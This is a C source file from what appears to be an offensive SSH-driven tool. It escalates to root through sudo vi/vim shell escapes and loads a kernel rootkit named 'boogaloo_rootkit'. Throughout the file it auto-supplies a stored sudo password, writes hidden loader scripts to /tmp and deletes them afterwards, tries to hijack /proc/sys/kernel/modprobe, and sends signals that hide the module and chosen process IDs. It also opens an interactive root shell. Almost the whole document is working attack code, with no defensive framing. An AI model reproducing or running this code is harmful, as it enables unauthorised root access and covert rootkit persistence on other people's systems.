
#include "vim_exploit.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <termios.h>

extern char *global_password;

// ==================== VIM Exploit Functions ====================

int execute_root_command_via_vim(ssh_session session, const char *command) {
    printf("[*] Executing root command via vim exploit: %s\n", command);
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *vim_command = "sudo vi -c ':!/bin/bash'\n";
    if (ssh_channel_write(channel, vim_command, strlen(vim_command)) < 0) {
        fprintf(stderr, "Error writing vim command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s\n", command);
    
    if (ssh_channel_write(channel, full_command, strlen(full_command)) < 0) {
        fprintf(stderr, "Error writing command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(3000000);
    
    const char *exit_cmd = "exit\n";
    ssh_channel_write(channel, exit_cmd, strlen(exit_cmd));
    
    usleep(1000000);
    
    const char *quit_vim = ":q!\n";
    ssh_channel_write(channel, quit_vim, strlen(quit_vim));
    
    char buffer[4096];
    int nbytes;
    int success_detected = 0;
    int timeout = 10;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "insmod") && !strstr(buffer, "error") && !strstr(buffer, "Error")) {
                success_detected = 1;
            }
            if (strstr(buffer, "Operation not permitted") || 
                strstr(buffer, "Permission denied") ||
                strstr(buffer, "Invalid module format")) {
                success_detected = 0;
                break;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    if (success_detected) {
        printf("[+] Root command executed successfully via vim exploit\n");
        return 0;
    } else {
        printf("[-] Command execution may have failed\n");
        return -1;
    }
}

int execute_root_command_via_vim_v2(ssh_session session, const char *command) {
    printf("[*] Executing root command via vim exploit (method 2): %s\n", command);
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char script_content[2048];
    snprintf(script_content, sizeof(script_content), 
             "#!/bin/bash\n"
             "echo \"Starting rootkit loading...\"\n"
             "%s\n"
             "if [ $? -eq 0 ]; then\n"
             "    echo \"INSMOD_SUCCESS\"\n"
             "    lsmod | grep boogaloo && echo \"MODULE_VERIFIED_LOADED\"\n"
             "else\n"
             "    echo \"INSMOD_FAILED\"\n"
             "fi\n"
             "echo \"COMMAND_EXECUTED_SUCCESSFULLY\"\n", command);
    
    char write_script_cmd[3072];
    snprintf(write_script_cmd, sizeof(write_script_cmd), 
             "cat > /tmp/.vim_script.sh << 'EOF'\n%sEOF\n", script_content);
    
    if (ssh_channel_write(channel, write_script_cmd, strlen(write_script_cmd)) < 0) {
        fprintf(stderr, "Error writing script creation command\n");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(1000000);
    
    const char *chmod_cmd = "chmod +x /tmp/.vim_script.sh\n";
    ssh_channel_write(channel, chmod_cmd, strlen(chmod_cmd));
    usleep(500000);
    
    const char *vim_exec_cmd = "sudo vi -c ':!/sbin/insmod /tmp/.rootkit_*/boogaloo_rootkit.ko' -c ':q!' /dev/null\n";
    if (ssh_channel_write(channel, vim_exec_cmd, strlen(vim_exec_cmd)) < 0) {
        fprintf(stderr, "Error executing vim command\n");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_prompt_detected = 0;
    
    nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
    if (nbytes > 0) {
        buffer[nbytes] = '\0';
        printf("Initial output: %s", buffer);
        
        if (strstr(buffer, "password") || strstr(buffer, "Password")) {
            password_prompt_detected = 1;
            printf("[!] Password prompt detected - vim exploit requires NOPASSWD sudo access\n");
        }
    }
    
    if (password_prompt_detected) {
        const char *cleanup_cmd = "rm -f /tmp/.vim_script.sh\n";
        ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
        ssh_channel_send_eof(channel);
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(5000000);
    
    const char *cleanup_cmd = "rm -f /tmp/.vim_script.sh\n";
    ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
    
    int success = 0;
    int module_verified = 0;
    int timeout = 15;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "INSMOD_SUCCESS")) {
                success = 1;
            }
            if (strstr(buffer, "MODULE_VERIFIED_LOADED")) {
                module_verified = 1;
            }
            if (strstr(buffer, "INSMOD_FAILED")) {
                success = 0;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    if (success && module_verified) {
        printf("[+] Rootkit successfully loaded and verified\n");
        return 0;
    } else if (success) {
        printf("[!] Command executed but module verification failed\n");
        return -1;
    } else {
        printf("[-] Command execution failed\n");
        return -1;
    }
}

int execute_vim_command_with_auto_password(ssh_session session, const char *vim_command) {
    if (!session || !vim_command) {
        fprintf(stderr, "[-] Invalid parameters for vim command execution\n");
        return -1;
    }
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    printf("[*] Executing vim command: %s\n", vim_command);
    
    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s\n", vim_command);
    
    if (ssh_channel_write(channel, full_command, strlen(full_command)) < 0) {
        fprintf(stderr, "Error writing vim command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_prompt_detected = 0;
    int password_supplied = 0;
    int command_executed = 0;
    int timeout = 20;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            // Detect password prompt
            if ((strstr(buffer, "password") != NULL || 
                 strstr(buffer, "Password") != NULL ||
                 strstr(buffer, "[sudo]") != NULL) && 
                !password_prompt_detected) {
                
                password_prompt_detected = 1;
                printf("[*] Password prompt detected, supplying password automatically...\n");
                
                if (global_password && strlen(global_password) > 0) {
                    char password_response[300];
                    snprintf(password_response, sizeof(password_response), "%s\n", global_password);
                    
                    if (ssh_channel_write(channel, password_response, strlen(password_response)) < 0) {
                        fprintf(stderr, "Error writing password: %s\n", ssh_get_error(session));
                        break;
                    }
                    
                    printf("[+] Password supplied automatically\n");
                    password_supplied = 1;
                    usleep(1000000);
                } else {
                    printf("[-] Password prompt detected but no password available\n");
                    break;
                }
            }
            
            // Check for successful execution indicators
            if (strstr(buffer, "INSMOD_DONE") || 
                strstr(buffer, "ROOTKIT_LOADED_SUCCESS") ||
                strstr(buffer, "MODULE_FOUND") ||
                strstr(buffer, "boogaloo_rootkit") ||
                strstr(buffer, "insmod: module loaded")) {
                command_executed = 1;
            }
            
            // Check for failure indicators
            if (strstr(buffer, "Operation not permitted") || 
                strstr(buffer, "Permission denied") ||
                strstr(buffer, "Invalid module format") ||
                strstr(buffer, "insmod: ERROR") ||
                strstr(buffer, "Sorry, try again") ||
                strstr(buffer, "incorrect password")) {
                printf("[-] Command execution failed\n");
                break;
            }
            
            // If we see shell prompt after password, command likely succeeded
            if (password_supplied && (strstr(buffer, "$") || strstr(buffer, "#") || strstr(buffer, "~"))) {
                command_executed = 1;
            }
        }
        
        usleep(500000);
        timeout--;
    }
    
    // Send exit command to clean up
    const char *exit_cmd = "exit\n";
    ssh_channel_write(channel, exit_cmd, strlen(exit_cmd));
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return command_executed ? 0 : -1;
}

int load_rootkit_via_vim_exploit_auto_password(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim exploit with auto-password: %s\n", rootkit_path);
    
    if (!global_password) {
        printf("[-] No password available for auto-password feature\n");
        return -1;
    }
    
    const char *vim_commands[] = {
        "sudo vi -c ':!/sbin/insmod %s' -c ':qa!' /dev/null",
        NULL
    };
    
    for (int attempt = 0; vim_commands[attempt] != NULL; attempt++) {
        printf("[*] Attempt %d with vim command variant\n", attempt + 1);
        
        char formatted_command[PATH_MAX + 200];
        snprintf(formatted_command, sizeof(formatted_command), 
                 vim_commands[attempt], rootkit_path);
        
        if (execute_vim_command_with_auto_password(session, formatted_command) == 0) {
            printf("[*] Verifying module loading...\n");
            
            // Проверка загрузки модуля
            ssh_channel channel = ssh_channel_new(session);
            if (channel) {
                if (ssh_channel_open_session(channel) == SSH_OK) {
                    if (ssh_channel_request_exec(channel, "lsmod | grep boogaloo") == SSH_OK) {
                        char verify_buffer[1024];
                        int verify_nbytes = ssh_channel_read(channel, verify_buffer, sizeof(verify_buffer) - 1, 0);
                        if (verify_nbytes > 0) {
                            verify_buffer[verify_nbytes] = '\0';
                            printf("%s", verify_buffer);
                            
                            if (strstr(verify_buffer, "boogaloo_rootkit")) {
                                printf("[+] Rootkit successfully loaded and verified on attempt %d\n", attempt + 1);
                                ssh_channel_close(channel);
                                ssh_channel_free(channel);
                                return 0;
                            }
                        }
                    }
                    ssh_channel_close(channel);
                }
                ssh_channel_free(channel);
            }
            
            // Если дошли сюда, модуль не загрузился
            printf("[-] Module not loaded despite successful command execution\n");
        }
        
        printf("[-] Attempt %d failed, trying next method...\n", attempt + 1);
        usleep(1000000);
    }
    
    printf("[-] All vim exploit attempts failed\n");
    return -1;
}

int load_rootkit_via_vim_script_auto_password(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim script method with auto-password: %s\n", rootkit_path);
    
    char script_command[2048];
    snprintf(script_command, sizeof(script_command),
             "cat > /tmp/.load_rootkit.sh << 'EOF' && "
             "chmod +x /tmp/.load_rootkit.sh && "
             "sudo vi -c ':!/tmp/.load_rootkit.sh' -c ':q!' /dev/null && "
             "rm -f /tmp/.load_rootkit.sh\n"
             "#!/bin/bash\n"
             "echo '[*] Loading rootkit module...'\n"
             "insmod %s\n"
             "if [ $? -eq 0 ]; then\n"
             "    echo '[+] ROOTKIT_LOADED_SUCCESS'\n"
             "    lsmod | grep boogaloo\n"
             "else\n"
             "    echo '[-] ROOTKIT_LOAD_FAILED'\n"
             "    echo 'Error code: '$?\n"
             "fi\n"
             "EOF", rootkit_path);
    
    return execute_vim_command_with_auto_password(session, script_command);
}

int load_rootkit_via_vim_no_sudo(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim without sudo (enhanced method)...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    // Create a more robust script with better error handling and reporting
    char script[2048];
    snprintf(script, sizeof(script),
        "cat > /tmp/.load_rootkit_enhanced.sh << 'EOF'\n"
        "#!/bin/bash\n"
        "echo 'Attempting to load rootkit...'\n"
        "ROOTKIT_PATH=\"%s\"\n"
        "if [ ! -f \"$ROOTKIT_PATH\" ]; then\n"
        "    echo \"ERROR: Rootkit file not found at $ROOTKIT_PATH\"\n"
        "    exit 1\n"
        "fi\n"
        "# Try multiple methods\n"
        "if command -v insmod >/dev/null 2>&1; then\n"
        "    insmod \"$ROOTKIT_PATH\" 2>&1 && echo 'INSMOD_SUCCESS' || echo 'INSMOD_FAILED'\n"
        "fi\n"
        "# Alternative method using /proc/sys/kernel if available\n"
        "if [ -w /proc/sys/kernel/modprobe ]; then\n"
        "    echo \"$ROOTKIT_PATH\" > /proc/sys/kernel/modprobe && echo 'MODPROBE_SUCCESS'\n"
        "fi\n"
        "# Check if module loaded\n"
        "lsmod | grep boogaloo && echo 'MODULE_VERIFIED'\n"
        "dmesg | grep -i rootkit | tail -3\n"
        "EOF\n"
        "chmod +x /tmp/.load_rootkit_enhanced.sh\n"
        "vim -c ':!/tmp/.load_rootkit_enhanced.sh' -c ':q!' /dev/null\n"
        "rm -f /tmp/.load_rootkit_enhanced.sh\n",
        rootkit_path);
    
    if (ssh_channel_request_exec(channel, script) == SSH_OK) {
        char buffer[4096];
        int nbytes;
        int success = 0;
        
        while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "INSMOD_SUCCESS") || 
                strstr(buffer, "MODPROBE_SUCCESS") || 
                strstr(buffer, "MODULE_VERIFIED")) {
                success = 1;
            }
        }
        
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return success ? 0 : -1;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return -1;
}

int hide_module_with_vim_auto_password(ssh_session session) {
    printf("[*] Hiding rootkit module using vim exploit with auto-password...\n");
    
    char hide_command[] = "sudo vi -c ':!kill -64 1' -c ':q!' /dev/null";
    
    if (execute_vim_command_with_auto_password(session, hide_command) == 0) {
        printf("[+] Rootkit module hidden via vim exploit\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to hide rootkit module\n");
        return -1;
    }
}

int show_module_with_vim_auto_password(ssh_session session) {
    printf("[*] Showing rootkit module using vim exploit with auto-password...\n");
    
    char hide_command[] = "sudo vi -c ':!kill -64 1' -c ':q!' /dev/null";
    
    if (execute_vim_command_with_auto_password(session, hide_command) == 0) {
        printf("[+] Rootkit module showed via vim exploit\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to show rootkit module\n");
        return -1;
    }
}

int hide_pid_with_vim_auto_password(ssh_session session, int pid) {
    printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid);
    
    char hide_pid_command[128];
    snprintf(hide_pid_command, sizeof(hide_pid_command), 
             "sudo vi -c ':!kill -62 %d' -c ':q!' /dev/null", pid);
    
    if (execute_vim_command_with_auto_password(session, hide_pid_command) == 0) {
        printf("[+] Process %d hidden via vim exploit\n", pid);
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to hide process %d\n", pid);
        return -1;
    }
}

int show_pid_with_vim_auto_password(ssh_session session, int pid) {
    printf("[*] Showing process %d using vim exploit with auto-password...\n", pid);
    
    char hide_pid_command[128];
    snprintf(hide_pid_command, sizeof(hide_pid_command), 
             "sudo vi -c ':!kill -62 %d' -c ':q!' /dev/null", pid);
    
    if (execute_vim_command_with_auto_password(session, hide_pid_command) == 0) {
        printf("[+] Process %d showed via vim exploit\n", pid);
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to show process %d\n", pid);
        return -1;
    }
}

int load_rootkit_vim_spawn_bash(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim bash spawn method...\n");
    
    if (!global_password) {
        fprintf(stderr, "[-] No password available for sudo\n");
        return -1;
    }
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(1000000); // Увеличиваем задержку
    
    // Создаем скрипт для загрузки модуля
    char create_script[2048];
    snprintf(create_script, sizeof(create_script),
             "cat > /tmp/.load_module.sh << 'EOF'\n"
             "#!/bin/bash\n"
             "echo '[*] Loading rootkit module...'\n"
             "/sbin/insmod %s\n"
             "if [ $? -eq 0 ]; then\n"
             "    echo 'MODULE_LOADED_SUCCESS'\n"
             "    lsmod | grep boogaloo\n"
             "else\n"
             "    echo 'MODULE_LOAD_FAILED'\n"
             "    echo 'Error code: '$?\n"
             "fi\n"
             "EOF\n"
             "chmod +x /tmp/.load_module.sh\n",
             rootkit_path);
    
    ssh_channel_write(channel, create_script, strlen(create_script));
    usleep(1500000);
    
    // Запускаем vim с spawn bash - используем более простой подход
    const char *vim_spawn = "sudo vi -c ':!/bin/bash -c \"/tmp/.load_module.sh\"' -c ':q!' /dev/null\n";
    ssh_channel_write(channel, vim_spawn, strlen(vim_spawn));
    
    usleep(3000000); // Даем время для появления запроса пароля
    
    // Обрабатываем запрос пароля более надежно
    char buffer[4096];
    int password_sent = 0;
    int attempts = 3;
    
    while (attempts > 0) {
        int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("Output: %s", buffer);
            
            // Проверяем различные варианты запроса пароля
            if ((strstr(buffer, "password") || 
                 strstr(buffer, "Password") || 
                 strstr(buffer, "[sudo]")) && 
                !password_sent) {
                
                printf("[*] Password prompt detected, sending password...\n");
                char pwd_response[512];
                snprintf(pwd_response, sizeof(pwd_response), "%s\n", global_password);
                
                // Отправляем пароль с новой строкой
                if (ssh_channel_write(channel, pwd_response, strlen(pwd_response)) > 0) {
                    printf("[+] Password sent\n");
                    password_sent = 1;
                }
                usleep(2000000);
            }
            
            // Проверяем успешную загрузку
            if (strstr(buffer, "MODULE_LOADED_SUCCESS") || 
                strstr(buffer, "boogaloo_rootkit")) {
                printf("[+] Rootkit loaded successfully!\n");
                
                // Очищаем временный скрипт
                const char *cleanup = "rm -f /tmp/.load_module.sh\n";
                ssh_channel_write(channel, cleanup, strlen(cleanup));
                
                ssh_channel_close(channel);
                ssh_channel_free(channel);
                return 0;
            }
            
            // Проверяем ошибки
            if (strstr(buffer, "MODULE_LOAD_FAILED") ||
                strstr(buffer, "Sorry, try again") ||
                strstr(buffer, "incorrect password")) {
                printf("[-] Module loading failed\n");
                break;
            }
        }
        
        usleep(1000000);
        attempts--;
    }
    
    // Если не сработало, пробуем альтернативный метод
    printf("[*] Trying echo password method...\n");
    
    char echo_method[1024];
    snprintf(echo_method, sizeof(echo_method),
             "echo '%s' | sudo -S vi -c ':!/sbin/insmod %s' -c ':q!' /dev/null 2>&1 && echo 'VIM_METHOD_SUCCESS'\n",
             global_password, rootkit_path);
    
    if (ssh_channel_request_exec(channel, echo_method) == SSH_OK) {
        char result_buffer[1024];
        int nbytes = ssh_channel_read(channel, result_buffer, sizeof(result_buffer) - 1, 0);
        if (nbytes > 0) {
            result_buffer[nbytes] = '\0';
            printf("Echo method output: %s\n", result_buffer);
            
            if (strstr(result_buffer, "VIM_METHOD_SUCCESS")) {
                printf("[+] Rootkit loaded via echo method\n");
                
                // Очищаем временный скрипт
                const char *cleanup = "rm -f /tmp/.load_module.sh\n";
                ssh_channel_write(channel, cleanup, strlen(cleanup));
                
                ssh_channel_close(channel);
                ssh_channel_free(channel);
                return 0;
            }
        }
    }
    
    // Очищаем временный скрипт
    const char *cleanup = "rm -f /tmp/.load_module.sh\n";
    ssh_channel_write(channel, cleanup, strlen(cleanup));
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return -1;
}

int interactive_vim_root_shell_auto_password(ssh_session session) {
    printf("[*] Starting interactive root shell via vim exploit with auto-password...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *vim_root_cmd = "sudo vi -c ':!/bin/bash'\n";
    ssh_channel_write(channel, vim_root_cmd, strlen(vim_root_cmd));
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_handled = 0;
    
    nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
    if (nbytes > 0) {
        buffer[nbytes] = '\0';
        printf("%s", buffer);
        
        if ((strstr(buffer, "password") || strstr(buffer, "Password") || strstr(buffer, "[sudo]")) 
            && global_password && !password_handled) {
            
            printf("[*] Auto-supplying password for vim root shell...\n");
            char password_response[300];
            snprintf(password_response, sizeof(password_response), "%s\n", global_password);
            ssh_channel_write(channel, password_response, strlen(password_response));
            password_handled = 1;
            usleep(2000000);
        }
    }
    
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    
    printf("[+] Interactive root shell started. Type 'exit' to quit.\n");
    
    fd_set fds;
    int active = 1;
    
    while (active) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(ssh_get_fd(session), &fds);
        
        struct timeval tv = {1, 0};
        int select_result = select(ssh_get_fd(session) + 1, &fds, NULL, NULL, &tv);
        
        if (select_result < 0) {
            perror("select");
            break;
        }
        
        if (FD_ISSET(STDIN_FILENO, &fds)) {
            nbytes = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (nbytes > 0) {
                if (nbytes >= 4 && strncmp(buffer, "exit", 4) == 0) {
                    active = 0;
                    break;
                }
                
                if (ssh_channel_write(channel, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to channel\n");
                    break;
                }
            } else if (nbytes == 0) {
                break;
            }
        }
        
        if (FD_ISSET(ssh_get_fd(session), &fds)) {
            nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
            if (nbytes > 0) {
                if (write(STDOUT_FILENO, buffer, nbytes) != nbytes) {
                    perror("write");
                    break;
                }
            } else if (nbytes < 0) {
                break;
            }
        }
        
        if (ssh_channel_is_eof(channel)) {
            break;
        }
    }
    
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("\n[*] Interactive root shell session ended\n");
    return 0;
}

int show_module_with_vim(ssh_session session) {
    printf("[*] Showing rootkit module using vim exploit...\n");
    
    char show_cmd[64];
    snprintf(show_cmd, sizeof(show_cmd), "kill -64 1");
    
    if (execute_root_command_via_vim(session, show_cmd) == 0) {
        printf("[+] Rootkit module visibility toggled\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to toggle rootkit module visibility\n");
        return -1;
    }
}

int hide_pid_with_vim(ssh_session session, int pid) {
    printf("[*] Hiding process %d using vim exploit...\n", pid);
    
    char hide_pid_cmd[64];
    snprintf(hide_pid_cmd, sizeof(hide_pid_cmd), "kill -62 %d", pid);
    
    if (execute_root_command_via_vim_v2(session, hide_pid_cmd) == 0) {
        printf("[+] Process %d hidden (method 2)\n", pid);
        return 0;
    }
    
    if (execute_root_command_via_vim(session, hide_pid_cmd) == 0) {
        printf("[+] Process %d hidden (method 1)\n", pid);
        return 0;
    }
    
    fprintf(stderr, "[-] Failed to hide process %d\n", pid);
    return -1;
}
